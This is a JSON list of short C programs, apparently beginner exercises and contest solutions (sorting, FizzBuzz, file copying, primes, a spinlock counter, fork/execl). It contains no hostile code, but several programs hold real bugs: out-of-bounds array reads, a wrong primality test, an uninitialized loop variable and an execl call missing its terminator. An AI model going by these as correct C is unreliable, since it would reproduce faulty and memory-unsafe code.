    "#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\nstatic const unsigned long nthreads = 4;\nstatic const unsigned long ncounts = 10000000;\nstatic unsigned long counter = 0;\nstatic unsigned int barrier = 0;\nvoid lock(unsigned int* barrier)\n{\n    if (barrier) {\n        while(__sync_fetch_and_or(barrier, 1))\n            ;\n    }\n}\nvoid unlock(unsigned int* barrier)\n{\n    if (barrier) {\n        *barrier = 0;\n    }\n}\nvoid counter_inc()\n{\n    counter++;\n}\nunsigned long read_counter()\n{\n    return counter;\n}\nvoid *threadfn(void *arg)\n{\n    int i;\n    for (i = 0; i < ncounts; i++) {\n        lock(&barrier);\n        counter_inc();\n        unlock(&barrier);\n    }\n    return 0;\n}\nint main()\n{\n    int i;\n    pthread_t pids[nthreads];\n    for (i = 0; i < nthreads; i++) {\n        int r = pthread_create(&pids[i], ((void*)0), threadfn, ((void*)0));\n        if (r != 0) {\n            perror(\"pthread_create: \");\n            exit(1);\n        }\n    }\n    for (i = 0; i < nthreads; i++) {\n        pthread_join(pids[i], ((void*)0));\n    }\n    printf(\"Expected counter value is: %lu\\n\", nthreads * ncounts);\n    printf(\"Real counter value is: %lu\\n\", read_counter());\n    return 0;\n}",
    "#include<stdio.h>\nint a[100000];\nint main()\n{\n    int n,b,k,i;\n    scanf(\"%d\",&n);\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%d\",&b);\n        a[b]++;\n    }\n    scanf(\"%d\",&k);\n    for(i=100000;i>=0;i--)\n    {\n        if(a[i]!=0)\n            k--;\n        if(k==0)\n        {\n            printf(\"%d %d\",i,a[i]);\n            return 0;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    char girl[30], boy[30];\n    scanf(\"%s %s\", girl, boy);\n    printf(\"%s and %s sitting in the tree\", girl, boy);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\nint main(void)\n{\n    char inName[64], outName[64];\n    FILE *in, *out;\n    int c;\n    printf(\"Enter the name of the file to be copied : \");\n    scanf(\"%63s\", inName);\n    printf(\"Enter the name of the output file : \");\n    scanf(\"%63s\", outName);\n    if ( (in = fopen(inName, \"rb\")) == ((void*)0) )\n    {\n        fprintf((stderr), \"Can't open the file %s for reading.\\n\", inName);\n        exit(1);\n    }\n    if ( (out = fopen(outName, \"wb\")) == ((void*)0) )\n    {\n        fprintf((stderr), \"Can't open the file %s for writing.\\n\", outName);\n        exit(1);\n    }\n    while ( (c = getc(in) ) != (-1) )\n        putc(toupper(c), out);\n    printf(\"The file has been copied\\n\");\n    fclose(in);\n    fclose(out);\n    return 0;\n}",
    "int main() {\n  double x = 1.0;\n  double q, r, s, t;\n  x = s;\n  q = (x = 3);\n  x += 7;\n  q = (x += 1.0);\n  q = (x += (r += (s += t)));\n  return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int op,n1,n2;\n    scanf(\"%d\\n%d\\n%d\",&op,&n1,&n2);\n    if((n1+n2)%2==0 && op == 0){\n        printf(\"0\\n\");\n    }\n    if((n1+n2)%2==0 && op == 1){\n        printf(\"1\\n\");\n    }\n    if((n1+n2)%2!=0 && op == 0){\n        printf(\"1\\n\");\n    }\n    if((n1+n2)%2!=0 && op == 1){\n        printf(\"0\\n\");\n    }\n}",
    "#include <stdio.h>\nint main(){\n float fNum1;\n printf(\"Ingresa un n%cmero: \",163);\n scanf(\"%f\",&fNum1);\n if(fNum1 == 0){\n  printf(\"\\nEl n%cmero es cero\",163);\n }else if (fNum1 > 0){\n  printf(\"El n%cmero %.2f es positivo\",163,fNum1);\n }else{\n  printf(\"El n%cmero %.2f es negativo\",163,fNum1);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int i;\n int const ASCII_RANGE = 255;\n for(i = 0; i<=ASCII_RANGE; i++){\n  printf(\"%c - %d\\n\",i,i);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n char haystack[20] = \"TutorialsPoint\";\n char needle[10] = \"Point\";\n char * ret;\n ret = strstr(haystack, needle);\n if ( ret != ((void*)0) ) {\n  printf(\"Found \\\"%s\\\" in \\\"%s\\\"\\n\\tHere's what came back: \\\"%s\\\"\\n\", needle, haystack, ret);\n } else {\n  printf(\"Couldn't find \\\"%s\\\" in \\\"%s\\\"\\n\\tHere's what came back: \\\"%s\\\"\\n\", needle, haystack, ret);\n }\n getchar();\n return 0;\n}",
    "#include <sys/types.h>\n#include <regex.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\nvoid do_regerror(int errcode, const regex_t *preg);\nint main() {\n    regex_t p;\n    regmatch_t *pmatch;\n    int rcomp_err, rexec_err;\n    char string[1024 +1];\n    int i;\n    rcomp_err = regcomp(&p, \"(^(.*[^\\\\])#.*$)|(^[^#]+$)\",\n                1 | 4);\n    if(rcomp_err) {\n        do_regerror(rcomp_err, &p);\n    }\n    pmatch = __builtin_alloca(sizeof(regmatch_t) * (p.re_nsub+1));\n    if(!pmatch) {\n        perror(\"alloca\");\n    }\n    printf(\"Input a string: \");\n    fgets(string, sizeof(string), (stdin));\n    rexec_err = regexec(&p, string, p.re_nsub+1, pmatch, 0);\n    if(rexec_err) {\n        do_regerror(rexec_err, &p);\n    } else {\n        for(i = 0; i <= p.re_nsub; i++) {\n            if(pmatch[i].rm_so != -1) {\n                char * submatch;\n                size_t matchlen = pmatch[i].rm_eo - pmatch[i].rm_so;\n                submatch = malloc(matchlen+1);\n                strncpy(submatch, string+pmatch[i].rm_so, matchlen);\n  submatch[matchlen] = '\\0';\n                printf(\"match %i: %s\\n\", i, submatch);\n                free(submatch);\n            }\n        }\n    }\n    exit(0);\n}\nvoid do_regerror(int errcode, const regex_t *preg) {\n    char *errbuf;\n    size_t errbuf_size;\n    errbuf_size = regerror(errcode, preg, ((void*)0), 0);\n    errbuf = __builtin_alloca(errbuf_size);\n    if(!errbuf) {\n        perror(\"alloca\");\n        return;\n    }\n    regerror(errcode, preg, errbuf, errbuf_size);\n    fprintf((stderr), \"%s\\n\", errbuf);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main()\n{\nchar ch , s[10] , sen[100];\nscanf(\"%c\",&ch);\nscanf(\"%s\",&s);\nscanf(\"\\n\");\nscanf(\"%[^\\n]%*c\", &sen) ;\nprintf(\"%c\\n\",ch);\nprintf(\"%s\\n\",s);\nprintf(\"%s\\n\",sen);\n    return 0;\n}",
    "#include<stdio.h>\nint main ()\n{\n  int i;\n  const char *s[] = { \"%d\\n\", \"Fizz\\n\", s[3] + 4, \"FizzBuzz\\n\" };\n  for (i = 1; i <= 100; i++)\n    printf(s[!(i % 3) + 2 * !(i % 5)], i);\n  return 0;\n}",
    "#include <stdio.h>\nint main (int argc, char *argv []){\n int bugs = 100;\n double bug_rate = 1.2;\n printf(\"You have %d bugs at the imaginary rate of %f.\\n\", bugs, bug_rate);\n unsigned long universe_of_defects = 1L * 5445454L * 4564664L * 46544L;\n printf(\"The entire universe has %ld bugs.\\n\", universe_of_defects);\n double expected_bugs = bugs * bug_rate;\n printf(\"You are expected to have %f bugs.\\n\", expected_bugs);\n double part_of_universe = expected_bugs / universe_of_defects;\n printf(\"That is only a %e portion of the universe.\\n\", part_of_universe);\n char nul_byte = '\\0';\n int care_percentage = bugs * nul_byte;\n printf(\"Which means you should care %d%%.\\n\", care_percentage);\n return 0;\n}",
    "#include <stdio.h>\n\nlong long int factorial(long long int n)\n{\n if (n == 0) {\n  return 1;\n } else if (n == 1) {\n  return 1;\n } else {\n  return ((n % 1000000007) * (factorial(n - 1) % 1000000007)) % 1000000007;\n }\n}\nint main()\n{\n long long int x, y;\n scanf(\"%lld%lld\", &x, &y);\n x = factorial(x);\n y = factorial(y);\n long long int answer = (x + y) % 1000000007;\n printf(\"%lld\\n\", answer);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\nvoid die(const char *message)\n{\n    if(errno) {\n        perror(message);\n    } else {\n        printf(\"ERROR: %s\\n\", message);\n    }\n    exit(1);\n}\ntypedef int (*compare_cb)(int a, int b);\nint *bubble_sort(int *numbers, int count, compare_cb cmp)\n{\n    int temp = 0;\n    int i = 0;\n    int j = 0;\n    int *target = malloc(count * sizeof(int));\n    if(!target) die(\"Memory error.\");\n    memcpy(target, numbers, count * sizeof(int));\n    for(i = 0; i < count; i++) {\n        for(j = 0; j < count - 1; j++) {\n            if(cmp(target[j], target[j+1]) > 0) {\n                temp = target[j+1];\n                target[j+1] = target[j];\n                target[j] = temp;\n            }\n        }\n    }\n    return target;\n}\nchar cbFuncName[200];\nint sorted_order(int a, int b)\n{\n    strcpy(cbFuncName, \"Sorted order.\");\n    return (a-b);\n}\nint reverse_order(int a, int b)\n{\n    strcpy(cbFuncName, \"Reverse order.\");\n    return (b-a);\n}\nint kek_order(int a, int b)\n{\n    strcpy(cbFuncName, \"Kek order.\");\n    return (a%(b+1));\n}\nvoid test_sorting(int *src_a, int size, compare_cb cmp)\n{\n    int *sorted = bubble_sort(src_a, size, cmp);\n    if(!sorted) die(\"Failed to sort as requested.\");\n    printf(\"%s\\n\", cbFuncName);\n    for(int i = 0; i < size; i++) {\n        printf(\"%d \", sorted[i]);\n    }\n    puts(\"\");\n    free(sorted);\n}\nint main()\n{\n    int testArr[] = {2,6,2,7,2,96,3,123,642,23,64,21,86};\n    int arrItemsCount = sizeof(testArr)/sizeof(int);\n    test_sorting(testArr, arrItemsCount, sorted_order);\n    test_sorting(testArr, arrItemsCount, reverse_order);\n    test_sorting(testArr, arrItemsCount, kek_order);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint s[100], n;\nint main() {\n int op;\n while (1) {\n  scanf(\"%d\", &op);\n  if (op == 1) {\n   int x;\n   scanf(\"%d\", &x);\n   if (n == 100) {\n    printf(\"error \");\n   } else {\n    s[n++] = x;\n   }\n  } else if (op == 0) {\n   if (n == 0) {\n    printf(\"error \");\n   } else {\n    printf(\"%d \", s[--n]);\n   }\n  } else break;\n }\n printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\n#include <ctype.h>\nint maxSum = (-2147483647 -1);\nint size;\nvoid Conquer(int a[], int i, int m, int j){\n int l, mid, f;\n f = i;\n mid = m;\n l = j;\n int sumL = 0, sumR = 0, sum = 0;\n for(int h = mid; h >= f; h--){\n  sum += a[h];\n  if(sum > sumL)\n   sumL = sum;\n }\n sum = 0;\n for (int k = mid + 1; k <= l; k++)\n {\n  sum += a[k];\n  if (sum > sumR)\n  {\n   sumR = sum;\n  }\n }\n if (maxSum < (sumR + sumL))\n  maxSum = sumL + sumR;\n}\nvoid Divide(int a[], int i, int j){\n if(i < j){\n  int mid = (i + j) / 2;\n  Divide(a, i, mid);\n  Divide(a, mid+1, j);\n  Conquer(a, i, mid, j);\n }\n}\nint main(int argc, char const *argv[])\n{\n int a[] = {-2,1,-3,4,-1,2,1,-5,4};\n size = sizeof(a)/sizeof(a[0]);\n Divide(a, 0, size - 1);\n printf(\"The maxSum is %d\\n\", maxSum );\n return 0;\n}",
    "#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\nint main() {\n    switch(fork()) {\n    case -1:\n        printf(\"fail to create subprocess\\n\");\n        break;\n    case 0:\n        printf(\"child process, pid = %d\\n\", getpid());\n        execl(\"/usr/bin/ls\", \"-l\");\n        sleep(10);\n        break;\n    default:\n        printf(\"parent process, pid = %d\\n\", getpid());\n        sleep(30);\n        break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid rand_array(int array[], int n, int seed);\nvoid sort_array(int array[], int n);\nvoid show_array(int array[], int n);\nint main(void)\n{\n    int array[10];\n    int i;\n    for (i = 0; i < 10; i++) {\n        rand_array(array, 10, i);\n        show_array(array, 10);\n    }\n    printf(\"\\n---------------------------------------------\\n\");\n    return 0;\n}\nvoid rand_array(int array[], int n, int seed)\n{\n    int i;\n    for (i = 0; i < n; i++)\n        array[i] = 0;\n    srand(seed);\n    for (i = 0; i < 1000; i++) {\n        array[rand() % n]++;\n    }\n}\nvoid show_array(int array[], int n)\n{\n    int i;\n    for (i = 0; i < n; i++) {\n        printf(\"%d \", array[i]);\n        if ((i+1) % 10 == 0)\n            printf(\"\\n\");\n    }\n    printf(\"\\n\");\n}\nvoid sort_array(int array[], int n)\n{\n    int i, j, tmp;\n    for (i = 1; i < n; i++) {\n        for (j = 0; j < n-i; j++) {\n            if (array[j] < array[j+1]) {\n                tmp = array[j];\n                array[j] = array[j+1];\n                array[j+1] = tmp;\n            }\n        }\n    }\n}",
    "#include <stdio.h>\nint max;\nint N;\nint T[15], P[15];\nint ch[15];\nvoid DFS(int d)\n{\n int i;\n if(d == N)\n {\n  int money = 0;\n  for(i=0;i<N;i++)\n  {\n   if(ch[i] == 1)\n    money += P[i];\n  }\n  if(max < money)\n   max = money;\n  return;\n }\n if(d+T[d] <= N && ch[d] == 0)\n {\n  ch[d] = 1;\n  for(i=1;i<T[d];i++)\n   ch[d+i] = 2;\n }\n DFS(d+1);\n if(ch[d] == 1)\n {\n  for(i=0;i<T[d];i++) ch[d+i] = 0;\n }\n DFS(d+1);\n}\nint main(void)\n{\n scanf(\"%d\", &N);\n int i;\n for(i=0;i<N;i++)\n  scanf(\"%d %d\", &T[i], &P[i]);\n for(i=0;i<N;i++) ch[i] = 0;\n max = 0;\n DFS(0);\n printf(\"%d\\n\", max);\n return 0;\n}",
    "#include <stdio.h>\nunsigned invert(unsigned x, int p, int n){\n    unsigned xmask = (~(~0 << n)) << (p-n+1);\n    return x ^ xmask;\n}\nint main(){\n    unsigned x = 111;\n    int p = 4;\n    int n = 3;\n    printf(\"%u\\n\", invert(x,p,n));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char a='A', b='B', c='C';\n    putchar(a);\n    putchar(b);\n    putchar(c);\n    putchar('\\n');\n    return 0;\n}",
    "#include <stdio.h>\ntypedef unsigned char* byte_pointer;\nvoid show_bytes(byte_pointer start, size_t len)\n{\n size_t i;\n for ( i = 0; i < len; i++ ) {\n  printf(\" %.2x\", start[i]);\n }\n printf(\"\\n\");\n}\nvoid show_int(int x)\n{\n show_bytes((byte_pointer)&x, sizeof(int));\n}\nvoid show_float(float x)\n{\n show_bytes((byte_pointer)&x, sizeof(float));\n}\nvoid show_pointer(void *x)\n{\n show_bytes((byte_pointer)&x, sizeof(void *));\n}\nvoid test_show_bytes (int val)\n{\n int ival = val;\n float fval = (float) ival;\n int *pval = &ival;\n show_int(ival);\n show_float(fval);\n show_pointer(pval);\n}\nint main(int argc, char *argv[])\n{\n int test_num = 328;\n test_show_bytes(test_num);\n return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main()\n{\n int alph, prechar;\n FILE *infile,*outfile;\n if(!(infile = fopen(\"inalph.txt\",\"r\")) || (!(outfile = fopen(\"outalph.txt\",\"w\"))))\n {\n  printf(\" \u30d5\u30a1\u30a4\u30eb\u306e\u8aad\u307f\u8fbc\u307f\u306b\u5931\u6557\\n\");\n  return -1;\n }\n while((alph = fgetc(infile)) != (-1))\n {\n  if((0 ? isalpha(alph) : (((unsigned)(alph)|32)-'a') < 26))\n  {\n   if('A' <= alph && alph <= 'Z')\n   {\n    alph = alph + ('a' - 'A');\n    fprintf(outfile, \"%c\", alph);\n   } else {\n    fprintf(outfile, \"%c\", alph);\n   }\n  } else if(alph == ' ') {\n   if(prechar == ' ')\n   {\n   } else {\n    fprintf(outfile, \"%c\", alph);\n   }\n  } else if(alph == '\\n') {\n   fprintf(outfile, \"%c\", alph);\n  } else {\n   if(prechar == ' ')\n   {\n    alph = ' ';\n   } else {\n    alph = ' ';\n    fprintf(outfile, \"%c\", alph);\n   }\n  }\n  prechar = alph;\n }\n fclose(infile);\n fclose(outfile);\n return 0;\n}",
    "#include <stdio.h>\nvoid permutation1(int a, int b);\nvoid permutation2(int* a, int* b);\nint main() {\n    int a, b;\n    printf(\"Enter 2 integers:\\n\");\n    scanf(\"%d\", &a);\n    scanf(\"%d\", &b);\n    printf(\"Initial state: a = %d, b = %d\\n\", a, b);\n    permutation1(a, b);\n    printf(\"After permutation1: a = %d, b = %d\\n\", a, b);\n    permutation2(&a, &b);\n    printf(\"After permutation2: a = %d, b = %d\\n\", a, b);\n    return 0;\n}\nvoid permutation1(int a, int b) {\n    int tmp = a;\n    a = b;\n    b = tmp;\n}\nvoid permutation2(int* a, int* b) {\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n int n, r, nn;\n printf(\"\\nEnter an integer > \");\n scanf(\"%d\", &n);\n while( n > 0 ){\n  r = n % 10;\n  nn= n / 10;\n  n= nn;\n  printf(\"\\n%d\", r);\n }\n printf(\"\\nThat's all, have a nice day!\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a,b;\n a = 100;\n b = 7;\n printf(\"%d / %d = %d\\n\",a,b,a/b);\n return(0);\n}",
    "#include<stdio.h>\nint main(void) {\n  int i;\n  int rank[5]={20,10,8,5,2};\n  FILE* fp;\n  fp=fopen(\"rank.txt\", \"w\");\n  for (i=0 ; i<5 ; i++) {\n     fprintf(fp, \"%d\\n\", rank[i]);\n  }\n  fclose(fp);\n}",
    "#include<stdio.h>\nint main(){\n  printf(\"Welcome to Hackoween!\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nchar *ax_read_line(void)\n{\n  int bufsize = 1024;\n  int position = 0;\n  char *buffer = malloc(sizeof(char) * bufsize);\n  int c;\n  if (!buffer) {\n    fprintf((stderr), \"lsh: allocation error\\n\");\n    exit(1);\n  }\n  while (1) {\n    c = getchar();\n    if (c == (-1) || c == '\\n') {\n      buffer[position] = '\\0';\n      return buffer;\n    } else {\n      buffer[position] = c;\n    }\n    position++;\n    if (position >= bufsize) {\n      bufsize += 1024;\n      buffer = realloc(buffer, bufsize);\n      if (!buffer) {\n        fprintf((stderr), \"lsh: allocation error\\n\");\n        exit(1);\n      }\n    }\n  }\n}\nint axon_loop() {\n    int status;\n    do {\n        printf(\"ax ~> \");\n        ax_read_line();\n    } while(status);\n}\nint main() {\n    axon_loop();\n    exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int temp[5] = {1, 2, 3, 4, 5};\n    int (*p2)[5] = &temp;\n    int i;\n    for (i = 0; i < 5; i++) {\n        printf(\"%d\\n\", *(*p2 + i));\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int A, B, C, D, R;\n    scanf(\"%d\", &A);\n    scanf(\"%d\", &B);\n    scanf(\"%d\", &C);\n    scanf(\"%d\", &D);\n    R = (A * B) - (C * D);\n    printf(\"DIFERENCA = %d\\n\", R);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(void) {\n int t;\n scanf(\"%d\",&t);\n for(int i=1;i<=t;i++)\n {\n     long long int n;\n     scanf(\"%lld\",&n);\n     long long int i=1;\n     long long int x=0;\n     while(x<=n)\n     {\n         x=pow(2,i);\n         i++;\n     }\n     i=i-2;\n     long long int b=floor(log2(n))+1;\n     long long unsigned int temp=((1<<b)-1)^n;\n     temp=temp+pow(2,i);\n     long long int temp2=pow(2,i)-1;\n     printf(\"%lld\\n\",temp*temp2);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    float nota_um, nota_dois = 0;\n    printf(\"Nota 1:\");\n    scanf(\"%f\", &nota_um);\n    printf(\"Nota 2:\");\n    scanf(\"%f\", &nota_dois);\n    float resultado = (nota_um + nota_dois) / 2;\n    printf(\"A media entre %.1f e %.1f \u00e9 igual a %.1f\\n\", nota_um, nota_dois, resultado);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"(d) printf(c) - because it doesn't have \\\"\\\"\\n\");\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <sys/types.h>\nint main(int argc, char *argv[])\n{\n printf(\"Number of arguments passed to this program: %d (including the program executable itself!)\\n\", argc);\n for(int i=0; i<argc; i++)\n  printf(\"argv[%d]=%s\\n\", i, argv[i]);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <math.h>\nunsigned char matrix[1024*1024];\nunsigned char tmpInv[1024*1024];\nunsigned char tmp[1024*1024];\nint quickPow[] = {1,2,4,8,16,32,64,128,256,512,1024};\nvoid rec(int n, int target, int r)\n{\n if (n > target) return;\n if (n == 0)\n {\n  matrix[0] = '0';\n  rec(n+1, target, r);\n } else {\n  int halfSquare = quickPow[n-1];\n  int halfSquare2 = halfSquare*halfSquare;\n  int halfMatrix = halfSquare2*2;\n  int i;\n  memcpy(tmp, matrix, halfSquare2);\n for (i = 0; i < halfSquare2; i++)\n  tmpInv[i] = 97-tmp[i];\n for (i = 0; i < halfSquare; i++)\n {\n  memcpy(matrix+((i*2)*halfSquare), tmp+halfSquare*i, halfSquare);\n  memcpy(matrix+((i*2+1)*halfSquare), tmp+halfSquare*i, halfSquare);\n }\n memcpy(matrix+halfMatrix, matrix, halfMatrix);\n for (i = 0; i < halfSquare; i++)\n {\n  if (r == 0)\n   memcpy(matrix+halfMatrix+((i*2+1)*halfSquare),tmpInv+halfSquare*i , halfSquare);\n  else if (r == 1)\n   memcpy(matrix+((i*2+1)*halfSquare), tmpInv+halfSquare*i, halfSquare);\n  else if (r == 2)\n   memcpy(matrix+((i*2)*halfSquare), tmpInv+halfSquare*i, halfSquare);\n  else if (r == 3)\n   memcpy(matrix+halfMatrix+(i*2*halfSquare), tmpInv+halfSquare*i, halfSquare);\n }\n  rec(n+1, target, r);\n }\n}\nint main()\n{\n int n, r;\n int i, squared;\n while (scanf(\"%d %d\", &n, &r) != (-1))\n {\n  squared = quickPow[n];\n  rec(0,n,r%4);\n  for (i = 0; i < squared; i++)\n  {\n   memcpy(tmp, matrix+(i*squared), squared);\n   tmp[squared] = '\\0';\n    printf(\"%s\\n\", tmp);\n  }\n }\n}",
    "extern void abort(void);\nextern void exit(int);\nunsigned int foo(unsigned int a)\n{\n  return ((unsigned char)(a + 1)) * 4;\n}\nint main(void)\n{\n  if (foo((unsigned char)~0))\n    abort ();\n  exit(0);\n}",
    "#include <stdio.h>\nint IsPrime(int num);\nint IsHowl(int num);\nint main()\n{\n int num,howl_flag=0,prime_flag=0,temp;\n printf(\"\\n\\t ***Program to check for Howling Primes***\\n\");\n printf(\"Enter the number to be checked\\n-->\");\n scanf(\"%d\",&num);\n prime_flag=IsPrime(num);\n howl_flag=IsHowl(num);\n if (prime_flag==2&&howl_flag==2)\n {\n  printf(\"\\nThe number is a howling prime.\\n\");\n }\n if (prime_flag==2&&howl_flag!=2)\n {\n  printf(\"\\nThe number is prime but not howling prime.\\n\");\n }\n if (prime_flag!=2)\n {\n  printf(\"The number is not prime\\n\");\n }\n return 0;\n}\nint IsPrime(int num)\n{\n int count;\n for (count=2;count<num;count++)\n {\n  if ((num%count)==0)\n  {\n   return 1;\n   break;\n  }\n  if ((num%count)!=0)\n  {\n   return 2;\n  }\n }\n return 0;\n}\nint IsHowl(int num)\n{\n int sum=0,flag=0;\n while (num)\n {\n  sum=sum+(num%10);\n  num = num/10;\n }\n flag=IsPrime(sum);\n return flag;\n}",
    "#include <stdio.h>\nint main(void)\n{\n float numbers[10] = {5.6, 4.3, 6.2, 6.4, 7.3, 2.3, 8.3, 9.2, 0.1, 1.9};\n int i, swapped;\n do\n {\n  swapped = 0;\n  for (i = 0; i < 10; i++)\n  {\n   if (numbers[i] < numbers[i + 1])\n   {\n    swapped = 1;\n    float number= numbers[i];\n    numbers[i] = numbers[i + 1];\n    numbers[i + 1] = number;\n   }\n  }\n  for (i = 0; i < 10; i++)\n   printf(\"%.2f \", numbers[i]);\n  printf(\"\\n\");\n } while (swapped);\n for (i = 0; i < 10; i++)\n  printf(\"%.2f \", numbers[i]);\n printf(\"\\n\");\n return 0;\n}"
]